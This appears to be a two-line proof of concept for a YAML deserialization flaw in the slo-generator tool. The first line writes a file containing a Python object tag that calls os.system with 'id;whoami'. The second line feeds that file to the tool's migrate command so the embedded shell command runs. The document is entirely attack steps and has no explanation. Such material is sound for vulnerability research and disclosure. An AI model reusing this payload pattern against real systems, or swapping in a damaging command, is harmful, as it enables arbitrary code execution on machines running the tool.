echo '!!python/object/apply:os.system ["id;whoami"]' > test.yaml

/home/yanlingong/.local/bin/slo-generator migrate -b test.yaml
